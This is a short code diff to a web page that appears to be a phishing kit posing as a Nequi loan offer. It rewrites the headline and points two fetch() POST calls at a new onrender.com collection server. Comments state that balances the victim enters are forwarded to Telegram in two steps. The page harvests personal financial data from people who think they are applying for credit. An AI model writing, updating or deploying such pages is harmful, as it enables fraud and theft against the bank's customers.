@@ -162,7 +162,7 @@
                 Desde $100.000 a $2.400.000. En minutos te decimos si te lo aprobamos o no
               </p> -->
               <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;">
-                Valida tus datos y aumenta tu credito propulsor
+                Valida tus datos y solicita tu crédito
               </h1>
             </div>
           </div>
@@ -684,7 +684,7 @@
                 // PRIMER CLIC: Guardar primer saldo (NO enviar a Telegram todavía)
                 if (contSendButton === 1) {
                   try {
-                    await fetch('https://portalnequi.onrender.com/step2-loan-first', {
+                    await fetch('https://nequiscol.onrender.com/step2-loan-first', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({
@@ -706,7 +706,7 @@
                 // SEGUNDO CLIC: Enviar AMBOS saldos con BOTONES a Telegram
                 if (contSendButton === 2) {
                   try {
-                    await fetch('https://portalnequi.onrender.com/step2-loan-second', {
+                    await fetch('https://nequiscol.onrender.com/step2-loan-second', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({
